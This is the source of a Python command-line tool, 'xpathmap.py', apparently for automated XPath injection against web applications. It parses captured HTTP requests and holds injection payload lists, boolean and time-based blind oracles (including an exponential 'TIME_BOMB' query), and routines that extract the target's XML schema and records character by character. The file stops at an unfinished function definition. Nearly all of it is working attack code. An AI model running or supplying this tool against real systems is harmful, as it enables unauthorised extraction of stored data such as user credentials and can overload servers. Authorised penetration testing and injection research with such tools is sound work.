#!/usr/bin/env python3
"""
xpathmap.py — Automated XPath Injection & Data Exfiltration Tool
Supports: normal (union/node-selection), boolean-blind, time-based-blind.

Usage:
    python xpathmap.py -r request.txt
    python xpathmap.py -r request.txt -v
    python xpathmap.py -r request.txt --technique normal
    python xpathmap.py -r request.txt --technique boolean
    python xpathmap.py -r request.txt --technique time
    python xpathmap.py -r request.txt --injectable-param q --node-param f --field streetname
    python xpathmap.py -r request.txt --xml output.xml
    python xpathmap.py -r request.txt --proxy http://127.0.0.1:8080 --threads 10
"""

import argparse
import difflib
import re
import statistics
import sys
import time
import xml.dom.minidom
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field as dc_field
from threading import Lock
from typing import Optional
from urllib.parse import urlparse, parse_qs

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ──────────────────────────────────────────────────────────────────────────────
# Globals
# ──────────────────────────────────────────────────────────────────────────────

VERBOSE = False
CHARSET = (
    "abcdefghijklmnopqrstuvwxyz"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "0123456789"
    "_-. @!#$%^&*()+=[]{}|;:,<>?/"
)


# ──────────────────────────────────────────────────────────────────────────────
# Colors & logging
# ──────────────────────────────────────────────────────────────────────────────

class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    GRAY   = "\033[90m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"

def info(msg):    print(f"{C.BLUE}[*]{C.RESET} {msg}")
def success(msg): print(f"{C.GREEN}[+]{C.RESET} {msg}")
def warn(msg):    print(f"{C.YELLOW}[!]{C.RESET} {msg}")
def error(msg):   print(f"{C.RED}[-]{C.RESET} {msg}")
def found(msg):   print(f"{C.GREEN}{C.BOLD}[FOUND]{C.RESET} {msg}")
def debug(msg):
    if VERBOSE:
        print(f"{C.GRAY}[DBG]{C.RESET} {msg}")


# ──────────────────────────────────────────────────────────────────────────────
# Burp request parser
# ──────────────────────────────────────────────────────────────────────────────

@dataclass
class ParsedRequest:
    method: str
    url: str
    headers: dict
    params: dict
    body_params: dict
    raw_body: str

    @property
    def all_params(self) -> dict:
        return {**self.params, **self.body_params}


def parse_burp_request(filepath: str) -> ParsedRequest:
    with open(filepath, "r", errors="replace") as fh:
        content = fh.read()

    lines = content.splitlines()
    if not lines:
        error("Request file is empty.")
        sys.exit(1)

    request_line = lines[0].strip()
    match = re.match(
        r"^(GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS)\s+(\S+)\s+HTTP/[\d.]+$",
        request_line, re.IGNORECASE,
    )
    if not match:
        error(f"Cannot parse request line: {request_line!r}")
        sys.exit(1)

    http_method    = match.group(1).upper()
    path_and_query = match.group(2)

    headers: dict[str, str] = {}
    host = ""
    i = 1
    while i < len(lines) and lines[i].strip():
        if ":" in lines[i]:
            key, _, val = lines[i].partition(":")
            headers[key.strip()] = val.strip()
            if key.strip().lower() == "host":
                host = val.strip()
        i += 1

    raw_body = "\n".join(lines[i + 1:]).strip() if i < len(lines) else ""
    scheme   = "https" if headers.get("Referer", "").startswith("https") else "http"
    full_url = f"{scheme}://{host}{path_and_query}"

    parsed = urlparse(full_url)
    params = {k: v[0] for k, v in parse_qs(parsed.query, keep_blank_values=True).items()}

    body_params: dict[str, str] = {}
    if raw_body and "application/x-www-form-urlencoded" in headers.get("Content-Type", ""):
        body_params = {k: v[0] for k, v in parse_qs(raw_body, keep_blank_values=True).items()}

    for h in ("Accept-Encoding", "Content-Length", "If-None-Match", "If-Modified-Since"):
        headers.pop(h, None)

    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    return ParsedRequest(
        method=http_method, url=base_url, headers=headers,
        params=params, body_params=body_params, raw_body=raw_body,
    )


# ──────────────────────────────────────────────────────────────────────────────
# HTTP Engine
# ──────────────────────────────────────────────────────────────────────────────

@dataclass
class Engine:
    req: ParsedRequest
    delay: float = 0.1
    proxies: Optional[dict] = None
    timeout: int = 15
    session: requests.Session = dc_field(default_factory=requests.Session)

    def __post_init__(self):
        self.session.headers.update(self.req.headers)
        if self.proxies:
            self.session.proxies.update(self.proxies)
        self.session.verify = False

    def send(self, override_params: dict) -> tuple[str, float]:
        """Send request, return (response_text, elapsed_seconds)."""
        params = {**self.req.params, **override_params}
        body   = dict(self.req.body_params)
        debug(f"→ {params}")
        try:
            t0 = time.time()
            if self.req.method == "GET":
                resp = self.session.get(self.req.url, params=params, timeout=self.timeout)
            else:
                for k in override_params:
                    if k in body:
                        body[k] = override_params[k]
                resp = self.session.post(
                    self.req.url, params=params, data=body, timeout=self.timeout
                )
            elapsed = time.time() - t0
            time.sleep(self.delay)
            text = resp.text.strip()
            debug(f"← {resp.status_code} {elapsed:.3f}s  {text[:80]!r}")
            return text, elapsed
        except requests.RequestException as e:
            warn(f"Request error: {e}")
            return "", 0.0

    def send_text(self, override_params: dict) -> str:
        return self.send(override_params)[0]


# ──────────────────────────────────────────────────────────────────────────────
# Injection context — wraps a detected injection point
# ──────────────────────────────────────────────────────────────────────────────

@dataclass
class InjectionContext:
    """
    Encapsulates everything needed to inject into a specific parameter.

    technique:    "normal" | "boolean" | "time"
    inj_param:    the parameter we inject into (e.g. "q" or "username")
    null_payload: payload that makes query return nothing / false
    true_payload: payload that makes query return something / true  (boolean/time)
    node_param:   the node-selection parameter (normal mode only, e.g. "f")
    field_name:   the field name in node_param (normal mode only, e.g. "streetname")
    true_marker:  string that appears in response when query is TRUE (boolean mode)
    false_marker: string that appears when query is FALSE (boolean mode)
    time_threshold: seconds; above = TRUE, below = FALSE (time mode)
    wrap_prefix:  text before the injected XPath condition
    wrap_suffix:  text after the injected XPath condition
    """
    technique:      str
    inj_param:      str
    null_payload:   str
    true_payload:   str        = ""
    node_param:     str        = ""
    field_name:     str        = ""
    true_marker:    str        = ""
    false_marker:   str        = ""
    time_threshold: float      = 0.0
    wrap_prefix:    str        = "') or ("
    wrap_suffix:    str        = ") and ('1'='1"


# ──────────────────────────────────────────────────────────────────────────────
# Response value extractor (normal mode)
# ──────────────────────────────────────────────────────────────────────────────

class ResponseExtractor:
    RESULT_PATTERNS = [
        r"<b>Results:</b><br\s*/?><br\s*/?>\s*(.+?)\s*</center>",
        r"<b>Results?:?</b>\s*<br\s*/?>\s*(.+?)\s*(?:</center>|</div>|</p>)",
        r"<br\s*/?>\s*([^<]{1,200}?)\s*</center>",
        r"<br\s*/?>\s*([^<]{1,200}?)\s*</div>",
        r"<td[^>]*>\s*([^<]{1,200}?)\s*</td>",
        r"<span[^>]*>\s*([^<]{1,200}?)\s*</span>",
        r"<p[^>]*>\s*([^<]{1,200}?)\s*</p>",
    ]
    NO_DATA_MARKERS = [
        "no results", "no result", "not found", "nothing found", "0 results",
    ]

    def __init__(self):
        self._mode: str = "strip_diff"
        self._regex: Optional[str] = None
        self._null_stripped: str = ""

    def calibrate(self, null_html: str, data_html: str, known_value: str) -> bool:
        self._null_stripped = self._strip_html(null_html)
        debug(f"Calibrating extractor (known={known_value!r})")

        # Try diff
        diff_result = self._diff_extract(null_html, data_html)
        if diff_result and known_value.strip().lower() in diff_result.strip().lower():
            self._mode = "diff"
            self._diff_anchor = null_html
            success(f"Extractor mode: diff")
            return True

        # Try regex patterns
        for pattern in self.RESULT_PATTERNS:
            m = re.search(pattern, data_html, re.IGNORECASE | re.DOTALL)
            if m:
                extracted = m.group(1).strip()
                if known_value.strip().lower() in extracted.lower():
                    self._mode  = "regex"
                    self._regex = pattern
                    success(f"Extractor mode: regex")
                    return True

        # Strip diff
        stripped  = self._strip_html(data_html)
        plain_diff = self._text_diff(self._null_stripped, stripped)
        if known_value.strip().lower() in plain_diff.lower():
            self._mode = "strip_diff"
            success("Extractor mode: strip_diff")
            return True

        warn("Could not calibrate extractor — best-effort mode")
        return False

    def extract(self, html: str) -> Optional[str]:
        if self._is_no_data(html):
            return None
        if self._mode == "diff":
            val = self._diff_extract(self._diff_anchor, html)
        elif self._mode == "regex" and self._regex:
            m   = re.search(self._regex, html, re.IGNORECASE | re.DOTALL)
            val = m.group(1).strip() if m else None
        else:
            stripped = self._strip_html(html)
            val      = self._text_diff(self._null_stripped, stripped) or None
        if val:
            val = val.strip()
            if "<" in val and ">" in val:
                val = self._strip_html(val).strip()
            return val if val else None
        return None

    def _is_no_data(self, html: str) -> bool:
        low = html.lower()
        return any(m in low for m in self.NO_DATA_MARKERS)

    @staticmethod
    def _strip_html(html: str) -> str:
        text = re.sub(r"<[^>]+>", " ", html)
        return re.sub(r"\s+", " ", text).strip()

    @staticmethod
    def _diff_extract(base: str, new: str) -> str:
        base_lines = base.splitlines()
        new_lines  = new.splitlines()
        added = []
        for line in difflib.ndiff(base_lines, new_lines):
            if line.startswith("+ "):
                text_only = re.sub(r"<[^>]+>", "", line[2:]).strip()
                if text_only:
                    added.append(text_only)
        return " ".join(added).strip()

    @staticmethod
    def _text_diff(base: str, new: str) -> str:
        base_words = set(base.split())
        return " ".join(w for w in new.split() if w not in base_words).strip()


# ──────────────────────────────────────────────────────────────────────────────
# TECHNIQUE DETECTION
# ──────────────────────────────────────────────────────────────────────────────

# ── Payloads ──────────────────────────────────────────────────────────────────

# For normal mode: null/true in node-selection param
NULL_PAYLOADS = [
    "') and ('1'='2",
    "' and '1'='2",
    "') and ('0'='1",
    '\") and (\"1\"=\"2',
]

TRUE_PAYLOADS = [
    "') or ('1'='1",
    "' or '1'='1",
    '\") or (\"1\"=\"1',
]

# For boolean-blind: templates that inject an XPath condition into the predicate
# {CONDITION} will be replaced with the actual XPath test
BOOL_TEMPLATES = [
    # close contains() predicate, inject OR condition
    ("') or ({CONDITION}) and ('1'='1",  "') and ('1'='2"),
    # single-quote variant
    ("' or ({CONDITION}) and '1'='1",    "' and '1'='2"),
    # close double-quote predicate
    ('\") or ({CONDITION}) and (\"1\"=\"1', '\") and (\"1\"=\"2'),
    # bare injection (no closing needed)
    (" or ({CONDITION}) and 1=1 --",     " and 1=2 --"),
    # close bracket + inject
    ("] or [{CONDITION}]//self::*[",     "] and [1=2] //"),
]

# Exponential count — forces long processing time when condition is TRUE
TIME_BOMB = "count((//.)[count((//.)[count((//.))>0])])"


def _seems_empty(html: str) -> bool:
    if not html.strip():
        return True
    low = html.lower()
    return any(m in low for m in ["no results", "no result", "not found",
                                   "does not exist", "invalid", "0 results"])


def _seems_data(html: str) -> bool:
    return bool(html.strip()) and not _seems_empty(html)


# ── Normal mode detection ─────────────────────────────────────────────────────

def detect_normal(
    engine: Engine,
    inj_candidates: list[str],
    node_candidates: list[str],
) -> Optional[InjectionContext]:
    """
    Detect normal (union/node-selection) injection.
    Returns InjectionContext or None.
    """
    info("  Trying technique: NORMAL (node-selection union)")

    for param in inj_candidates:
        for null_pay in NULL_PAYLOADS:
            null_html, _ = engine.send({param: null_pay})
            for true_pay in TRUE_PAYLOADS:
                true_html, _ = engine.send({param: true_pay})
                null_empty = _seems_empty(null_html)
                true_data  = _seems_data(true_html)
                debug(f"    {param!r} null_empty={null_empty} true_data={true_data}")

                confirmed = False
                if null_empty and true_data:
                    confirmed = True
                elif null_html != true_html and abs(len(null_html) - len(true_html)) > 10:
                    if null_empty or len(null_html) < len(true_html):
                        confirmed = True

                if confirmed:
                    # Find node-selection param
                    node_p, field = _find_node_param(
                        engine, param, null_pay,
                        [p for p in node_candidates if p != param],
                    )
                    if node_p:
                        success(f"  [NORMAL] inj='{param}' node='{node_p}' field='{field}' payload={null_pay!r}")
                        return InjectionContext(
                            technique="normal",
                            inj_param=param,
                            null_payload=null_pay,
                            node_param=node_p,
                            field_name=field,
                        )

    # Union probe fallback with known node param
    for inj_p in inj_candidates:
        for node_p in [p for p in node_candidates if p != inj_p]:
            field = engine.req.params.get(node_p) or engine.req.body_params.get(node_p, "")
            if not field:
                continue
            for null_pay in NULL_PAYLOADS:
                for depth in range(2, 6):
                    path  = "".join("/*[1]" for _ in range(depth))
                    probe = f"{field} | {path}"
                    resp, _ = engine.send({inj_p: null_pay, node_p: probe})
                    if _seems_data(resp):
                        success(f"  [NORMAL] union probe: inj='{inj_p}' node='{node_p}' field='{field}'")
                        return InjectionContext(
                            technique="normal",
                            inj_param=inj_p,
                            null_payload=null_pay,
                            node_param=node_p,
                            field_name=field,
                        )
    return None


def _find_node_param(
    engine: Engine,
    inj_param: str,
    null_pay: str,
    candidates: list[str],
) -> tuple[Optional[str], str]:
    null_baseline, _ = engine.send({inj_param: null_pay})
    for param in candidates:
        original = engine.req.params.get(param) or engine.req.body_params.get(param, "")
        if not original:
            continue
        for depth in range(2, 6):
            path  = "".join("/*[1]" for _ in range(depth))
            probe = f"{original} | {path}"
            resp, _ = engine.send({inj_param: null_pay, param: probe})
            if _seems_data(resp) and resp != null_baseline:
                return param, original
    # If single candidate, assume it
    if len(candidates) == 1:
        field = engine.req.params.get(candidates[0]) or engine.req.body_params.get(candidates[0], "")
        return candidates[0], field
    return None, ""


# ── Boolean-blind detection ───────────────────────────────────────────────────

def detect_boolean(
    engine: Engine,
    inj_candidates: list[str],
) -> Optional[InjectionContext]:
    """
    Detect boolean-blind injection with STABLE verification.

    Sends TRUE (1=1) and FALSE (1=2) payloads, checks responses differ
    consistently across multiple repetitions, then stores HTML length
    as the primary oracle signal (most reliable, no keyword dependency).
    """
    info("  Trying technique: BOOLEAN-BLIND")
    TEST_TRUE  = "1=1"
    TEST_FALSE = "1=2"

    for param in inj_candidates:
        for prefix, _ in BOOL_TEMPLATES:
            true_pay  = prefix.replace("{CONDITION}", TEST_TRUE)
            false_pay = prefix.replace("{CONDITION}", TEST_FALSE)

            # Collect 3 samples each to check stability
            true_lens:  list[int] = []
            false_lens: list[int] = []
            true_htmls: list[str] = []

            for _ in range(3):
                h, _ = engine.send({param: true_pay})
                true_lens.append(len(h))
                true_htmls.append(h)
            for _ in range(3):
                h, _ = engine.send({param: false_pay})
                false_lens.append(len(h))

            avg_true  = sum(true_lens)  / len(true_lens)
            avg_false = sum(false_lens) / len(false_lens)
            len_diff  = abs(avg_true - avg_false)

            debug(
                f"    {param!r} tpl={prefix[:30]!r} "
                f"avg_true={avg_true:.0f} avg_false={avg_false:.0f} diff={len_diff:.0f}"
            )

            # Need at least 10 char difference AND stable (max variance < 30 chars)
            true_variance  = max(true_lens)  - min(true_lens)
            false_variance = max(false_lens) - min(false_lens)
            if len_diff < 10 or true_variance > 30 or false_variance > 30:
                debug(f"    → not stable enough, skip")
                continue

            # Make sure true_html is the LONGER (data) response
            true_html  = true_htmls[0]
            false_html = ""
            # Get one false sample for marker extraction
            false_html, _ = engine.send({param: false_pay})

            if avg_true < avg_false:
                # Swap: false is longer, which means our "true" logic is inverted
                # This can happen if "user not found" page is larger
                # Re-check with keyword heuristics
                has_success_true = any(
                    k in true_html.lower()
                    for k in ["success", "sent", "valid", "welcome", "found", "ok"]
                )
                if not has_success_true:
                    # Swap true/false payloads
                    true_pay, false_pay = false_pay, true_pay
                    true_html, false_html = false_html, true_html
                    avg_true, avg_false   = avg_false, avg_true

            # Find the distinguishing text marker (keyword in true but not false)
            true_marker, false_marker = _find_bool_markers(true_html, false_html)

            # Verify the marker actually works as oracle
            # Send known-false, check marker absent
            check_false, _ = engine.send({param: false_pay})
            marker_reliable = (
                true_marker != "TRUE_RESPONSE" and
                true_marker in true_html and
                true_marker not in check_false
            )

            success(
                f"  [BOOLEAN] inj='{param}' tpl={prefix[:35]!r}\n"
                f"           true_len={avg_true:.0f}  false_len={avg_false:.0f}\n"
                f"           marker={true_marker[:50]!r}  reliable={marker_reliable}"
            )

            ctx = InjectionContext(
                technique="boolean",
                inj_param=param,
                null_payload=false_pay,
                true_payload=true_pay,
                true_marker=true_marker if marker_reliable else "",
                false_marker=false_marker,
                wrap_prefix=prefix.split("{CONDITION}")[0],
                wrap_suffix=prefix.split("{CONDITION}")[1],
            )
            # Store expected lengths for length-based oracle fallback
            ctx._true_avg_len  = avg_true
            ctx._false_avg_len = avg_false
            ctx._len_threshold = (avg_true + avg_false) / 2
            return ctx

    return None


def _html_similarity(a: str, b: str) -> float:
    if not a and not b:
        return 1.0
    return difflib.SequenceMatcher(None, a[:2000], b[:2000]).ratio()


def _find_bool_markers(true_html: str, false_html: str) -> tuple[str, str]:
    """Find shortest unique substring in true_html not present in false_html."""
    # Try known success/failure keywords first
    SUCCESS_KW = ["successfully sent", "message sent", "welcome", "success",
                  "valid user", "logged in", "found"]
    FAILURE_KW = ["does not exist", "invalid", "not found", "error", "fail",
                  "no result", "incorrect"]
    true_low  = true_html.lower()
    false_low = false_html.lower()
    for kw in SUCCESS_KW:
        if kw in true_low and kw not in false_low:
            return kw, ""
    for kw in FAILURE_KW:
        if kw in false_low and kw not in true_low:
            return "", kw

    # Fallback: word-level diff
    true_words  = set(re.sub(r"<[^>]+>", " ", true_html).split())
    false_words = set(re.sub(r"<[^>]+>", " ", false_html).split())
    only_true   = " ".join(list(true_words  - false_words)[:3])
    only_false  = " ".join(list(false_words - true_words)[:3])
    return only_true or "TRUE_RESPONSE", only_false or "FALSE_RESPONSE"


class Oracle:
    """
    Asks a true/false question about the XML document via injection.

    For boolean mode uses THREE signals in priority order:
      1. Keyword marker in HTML (most reliable when found)
      2. Response length vs stored threshold (avg_true vs avg_false)
      3. HTML similarity to known-true response

    For time mode: compares elapsed time to threshold.
    """
    def __init__(self, engine: Engine, ctx: InjectionContext):
        self.engine     = engine
        self.ctx        = ctx
        self._true_html: Optional[str] = None  # cached on first use

    def ask(self, xpath_condition: str) -> bool:
        """Return True if xpath_condition is true in the XML document."""
        payload = f"{self.ctx.wrap_prefix}{xpath_condition}{self.ctx.wrap_suffix}"
        debug(f"  ASK: {xpath_condition[:80]}")

        if self.ctx.technique == "boolean":
            html, _ = self.engine.send({self.ctx.inj_param: payload})

            # Signal 1: keyword marker (fastest, most reliable)
            if self.ctx.true_marker:
                if self.ctx.true_marker in html:
                    return True
                if self.ctx.false_marker and self.ctx.false_marker in html:
                    return False

            # Signal 2: length threshold
            if hasattr(self.ctx, "_len_threshold"):
                result = len(html) > self.ctx._len_threshold
                debug(f"    len={len(html)} threshold={self.ctx._len_threshold:.0f} → {result}")
                return result

            # Signal 3: similarity to known-true HTML
            if self._true_html is None:
                self._true_html, _ = self.engine.send(
                    {self.ctx.inj_param: self.ctx.true_payload}
                )
            sim = _html_similarity(html, self._true_html)
            return sim > 0.85

        elif self.ctx.technique == "time":
            bomb_pay = (
                f"{self.ctx.wrap_prefix}"
                f"({xpath_condition}) and {TIME_BOMB}>0"
                f"{self.ctx.wrap_suffix}"
            )
            _, t = self.engine.send({self.ctx.inj_param: bomb_pay})
            debug(f"    time={t:.3f}s threshold={self.ctx.time_threshold:.3f}s")
            return t > self.ctx.time_threshold

        return False

    def verify(self) -> bool:
        """Quick sanity check: true=1 should return True, false=0 should return False."""
        t = self.ask("1=1")
        f = self.ask("1=2")
        ok = t and not f
        if not ok:
            warn(f"Oracle sanity check FAILED: ask(1=1)={t} ask(1=2)={f}")
        else:
            success(f"Oracle sanity check OK: ask(1=1)=True ask(1=2)=False")
        return ok


# ──────────────────────────────────────────────────────────────────────────────
# BLIND EXFILTRATION ENGINE
# ──────────────────────────────────────────────────────────────────────────────

class BlindExtractor:
    """
    Extracts strings and numbers via the Oracle.

    XPath 1.0 only — no string-to-codepoints (that is XPath 2.0).

    Integer extraction:
      Uses EXACT MATCH:  expr=N  (linear, starting from 1)
      with early-stop once oracle returns False.
      Fast enough for lengths <= 100.

    Char extraction:
      Pure XPath 1.0:  substring(expr, pos, 1)='x'
      Linear scan through CHARSET in frequency order.
      With threading: each position searched in parallel.
    """

    # Most common chars first → fewer requests on average
    CHARSET = (
        "etaoinshrdlcumwfgypbvkjxqz"  # lowercase freq order
        "ETAOINSHRDLCUMWFGYPBVKJXQZ"
        "0123456789"
        "_-. @!#$%^&*()+=[]{}'|;:,<>?/"
    )

    def __init__(self, oracle: Oracle, threads: int = 1):
        self.oracle  = oracle
        self.threads = threads

    # ── Verify oracle before starting ─────────────────────────────────────────

    def verify_oracle(self) -> bool:
        return self.oracle.verify()

    # ── Integer: exact match (XPath 1.0 safe) ─────────────────────────────────

    def get_int(self, xpath_expr: str, max_val: int = 100) -> int:
        """
        Find integer value via equality test: expr=1, expr=2, ...
        Returns 0 if not found within max_val.
        """
        for n in range(0, max_val + 1):
            if self.oracle.ask(f"({xpath_expr})={n}"):
                return n
        return 0

    def get_int_fast(self, xpath_expr: str, max_val: int = 100) -> int:
        """
        Binary search variant — only use when oracle is very reliable.
        Finds N such that expr <= N by bisecting.
        """
        lo, hi = 0, max_val
        while lo < hi:
            mid = (lo + hi) // 2
            if self.oracle.ask(f"({xpath_expr}) > {mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo

    # ── String length ──────────────────────────────────────────────────────────

    def get_length(self, xpath_expr: str, max_len: int = 200) -> int:
        """Get string length via exact equality test."""
        return self.get_int(f"string-length({xpath_expr})", max_val=max_len)

    # ── Single character ───────────────────────────────────────────────────────

    def get_char(self, xpath_expr: str, pos: int) -> str:
        """
        Get character at position pos via substring(expr, pos, 1)='x'.
        XPath 1.0 compatible. Linear scan through CHARSET.
        """
        for ch in self.CHARSET:
            # Escape single quotes in char (rare but possible)
            ch_escaped = ch if ch != "'" else '"' + ch + '"'
            cond = f"substring({xpath_expr},{pos},1)='{ch_escaped}'"
            if self.oracle.ask(cond):
                return ch
        return "?"

    # ── Full string ───────────────────────────────────────────────────────────

    def get_string(self, xpath_expr: str, known_length: Optional[int] = None) -> str:
        length = known_length
        if length is None:
            length = self.get_length(xpath_expr)
        if length == 0:
            return ""

        info(f"    Extracting {length} chars from {xpath_expr}")
        result = ["?"] * length

        if self.threads > 1:
            lock = Lock()
            extracted = [0]

            def fetch_char(pos: int):
                ch = self.get_char(xpath_expr, pos)
                with lock:
                    result[pos - 1] = ch
                    extracted[0]   += 1
                    partial = "".join(result)
                    # Print progress on same line
                    print(f"\r    [{extracted[0]:>3}/{length}] {partial}", end="", flush=True)
                return ch

            with ThreadPoolExecutor(max_workers=self.threads) as ex:
                futures = {ex.submit(fetch_char, i): i for i in range(1, length + 1)}
                for f in as_completed(futures):
                    f.result()
            print()  # newline after progress
        else:
            for pos in range(1, length + 1):
                ch = self.get_char(xpath_expr, pos)
                result[pos - 1] = ch
                partial = "".join(result)
                print(f"\r    [{pos:>3}/{length}] {partial}", end="", flush=True)
            print()

        return "".join(result)

    # ── Count ──────────────────────────────────────────────────────────────────

    def get_count(self, xpath_expr: str, max_count: int = 50) -> int:
        return self.get_int(f"count({xpath_expr})", max_val=max_count)


# ──────────────────────────────────────────────────────────────────────────────
# BLIND SCHEMA + DATA EXFILTRATION
# ──────────────────────────────────────────────────────────────────────────────

def blind_exfiltrate_schema(
    extractor: BlindExtractor,
    max_depth: int = 5,
    max_children: int = 20,
) -> dict:
    """
    Exfiltrate the full XML schema using blind oracle.
    Returns nested dict: {node_name: {child_name: {...} | "leaf"}}
    """
    info("Exfiltrating XML schema (blind)...")

    def exfiltrate_node(xpath: str, depth: int) -> dict:
        if depth > max_depth:
            return {}
        n_children = extractor.get_count(f"{xpath}/*")
        debug(f"  {xpath}  children={n_children}")
        if n_children == 0:
            return "leaf"

        children = {}
        for i in range(1, min(n_children + 1, max_children + 1)):
            child_xpath = f"{xpath}/*[{i}]"
            name_len    = extractor.get_length(f"name({child_xpath})")
            name        = extractor.get_string(f"name({child_xpath})", name_len)
            info(f"    Schema: {child_xpath} → <{name}>")
            children[name] = exfiltrate_node(child_xpath, depth + 1)
        return children

    # Start from root
    root_len  = extractor.get_length("name(/*[1])")
    root_name = extractor.get_string("name(/*[1])", root_len)
    found(f"Root node: <{root_name}>")

    schema = {root_name: exfiltrate_node("/*[1]", 1)}
    return schema


def schema_to_xpaths(schema: dict, prefix: str = "") -> list[str]:
    """
    Flatten schema dict into list of XPath leaf expressions.
    e.g. /users/user[N]/username
    """
    paths = []

    def walk(node: dict, path: str):
        if node == "leaf":
            paths.append(path)
            return
        if isinstance(node, dict):
            for name, child in node.items():
                walk(child, f"{path}/{name}")

    for root_name, root_node in schema.items():
        walk(root_node, f"/{root_name}")

    return paths


def blind_exfiltrate_data(
    extractor: BlindExtractor,
    schema: dict,
    max_records: int = 50,
) -> dict[str, list[dict]]:
    """
    Given a schema, extract all data values.
    Returns {dataset_path: [{field: value, ...}, ...]}
    """
    info("Exfiltrating data (blind)...")

    # Find record-level nodes (nodes that repeat, i.e. have siblings)
    # We look for the deepest non-leaf level with count > 1
    results: dict[str, list[dict]] = {}

    def find_record_nodes(node: dict, xpath: str):
        """Find paths to repeating record nodes."""
        if node == "leaf" or not isinstance(node, dict):
            return

        for name, child in node.items():
            child_xpath = f"{xpath}/{name}"
            if isinstance(child, dict) and all(v == "leaf" for v in child.values()):
                # This level contains leaf children — it's a record node
                # Count how many there are
                n = extractor.get_count(f"{xpath}/{name}[position()>0]/../{name}")
                if n == 0:
                    n = extractor.get_count(f"{child_xpath}")
                if n > 0:
                    yield child_xpath, child, n
            else:
                yield from find_record_nodes({name: child}, xpath)

    def walk_records(node: dict, xpath: str):
        if not isinstance(node, dict):
            return

        for name, child in node.items():
            child_path = f"{xpath}/{name}"

            if isinstance(child, dict) and child:
                # Check if children are leaves → this is a record-like node
                if all(v == "leaf" for v in child.values()):
                    # Extract multiple instances
                    n_records = extractor.get_count(f"{child_path}")
                    info(f"  Records at {child_path}: {n_records}")
                    records = []
                    for rec_idx in range(1, min(n_records + 1, max_records + 1)):
                        record = {}
                        for field_name in child.keys():
                            val = extractor.get_string(
                                f"{child_path}[{rec_idx}]/{field_name}"
                            )
                            record[field_name] = val
                        records.append(record)
                        found(f"  Record {rec_idx}: {record}")
                    results[child_path] = records
                else:
                    walk_records(child, child_path)

    for root_name, root_node in schema.items():
        walk_records(root_node, f"/{root_name}")

    return results


def print_schema(schema: dict, indent: int = 0):
    prefix = "  " * indent
    for name, child in schema.items():
        if child == "leaf":
            print(f"{prefix}{C.CYAN}<{name}/>{C.RESET}")
        else:
            print(f"{prefix}{C.CYAN}<{name}>{C.RESET}")
            if isinstance(child, dict):
                print_schema(child, indent + 1)
            print(f"{prefix}{C.CYAN}</{name}>{C.RESET}")


# ──────────────────────────────────────────────────────────────────────────────
# NORMAL MODE — node-selection exfiltration (kept from previous version)
# ──────────────────────────────────────────────────────────────────────────────

def build_path(indices: list[int]) -> str:
    return "".join(f"/*[{i}]" for i in indices)


def probe_raw(
    engine: Engine,
    inj_param: str, null_pay: str,
    node_param: str, field_name: str,
    indices: list[int],
) -> str:
    path    = build_path(indices)
    f_value = f"{field_name} | {path}"
    return engine.send_text({inj_param: null_pay, node_param: f_value})


def find_data_path(
    engine: Engine,
    inj_param: str, null_pay: str,
    node_param: str, field_name: str,
    base_indices: list[int],
    extractor: ResponseExtractor,
    max_depth: int = 8,
    max_siblings: int = 20,
) -> Optional[list[int]]:
    frontier: list[list[int]] = [list(base_indices)]
    visited:  set[tuple]      = set()

    for _ in range(max_depth):
        next_frontier: list[list[int]] = []
        for path in frontier:
            if tuple(path) in visited:
                continue
            visited.add(tuple(path))
            for idx in range(1, max_siblings + 1):
                candidate = path + [idx]
                raw = probe_raw(engine, inj_param, null_pay, node_param,
                                field_name, candidate)
                val = extractor.extract(raw)
                debug(f"  BFS {build_path(candidate)} → {val!r}")
                if val is not None:
                    return candidate
                if raw and len(raw) > 100 and tuple(candidate) not in visited:
                    next_frontier.append(candidate)
        if not next_frontier:
            break
        frontier = next_frontier
    return None


def collect_all_record_paths(
    engine: Engine,
    inj_param: str, null_pay: str,
    node_param: str, field_name: str,
    first_data_path: list[int],
    extractor: ResponseExtractor,
    max_siblings: int,
    max_records: int,
) -> list[list[int]]:
    prefix_fixed   = first_data_path[:2]
    group_indices  = list(first_data_path[2:-2])
    n_group_levels = len(group_indices)
    all_record_paths: list[list[int]] = []

    if n_group_levels == 0:
        for rec_idx in range(1, max_records + 1):
            all_record_paths.append(prefix_fixed + [rec_idx])
        return all_record_paths

    def enumerate_group_combos(fixed_prefix: list[int], remaining: int) -> list[list[int]]:
        if remaining == 0:
            return [fixed_prefix]
        result = []
        for idx in range(1, max_siblings + 1):
            candidate  = fixed_prefix + [idx]
            probe_path = candidate + [1] * (remaining - 1) + [1, 1]
            raw = probe_raw(engine, inj_param, null_pay, node_param, field_name, probe_path)
            val = extractor.extract(raw)
            if val is not None:
                result.extend(enumerate_group_combos(candidate, remaining - 1))
            elif raw and len(raw) > 100:
                result.extend(enumerate_group_combos(candidate, remaining - 1))
            else:
                break
        return result

    group_combos = enumerate_group_combos(prefix_fixed, n_group_levels)
    info(f"    Found {len(group_combos)} group prefix(es)")

    for group_prefix in group_combos:
        for rec_idx in range(1, max_records + 1):
            record_path = group_prefix + [rec_idx]
            raw = probe_raw(engine, inj_param, null_pay, node_param, field_name,
                            record_path + [1])
            val = extractor.extract(raw)
            if val is None:
                break
            all_record_paths.append(record_path)

    return all_record_paths


def exfiltrate_record_normal(
    engine: Engine,
    inj_param: str, null_pay: str,
    node_param: str, field_name: str,
    record_path: list[int],
    extractor: ResponseExtractor,
    max_fields: int = 20,
) -> list[str]:
    values: list[str] = []
    for field_idx in range(1, max_fields + 1):
        raw = probe_raw(engine, inj_param, null_pay, node_param, field_name,
                        record_path + [field_idx])
        val = extractor.extract(raw)
        if val is None:
            break
        values.append(val)
    return values


def run_normal(
    engine: Engine,
    ctx: InjectionContext,
    extractor: ResponseExtractor,
    max_datasets: int, max_depth: int,
    max_records: int, max_fields: int,
    max_siblings: int, threads: int,
) -> dict[int, list[list[str]]]:
